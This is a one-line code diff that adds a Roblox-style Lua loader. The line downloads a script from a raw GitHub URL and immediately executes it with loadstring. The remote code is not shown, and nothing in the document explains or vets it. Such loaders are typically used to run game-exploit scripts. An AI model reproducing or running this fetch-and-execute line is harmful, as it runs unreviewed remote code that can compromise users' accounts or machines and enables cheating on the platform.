@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/79-x/W/main/Hello%20Kitty"))()
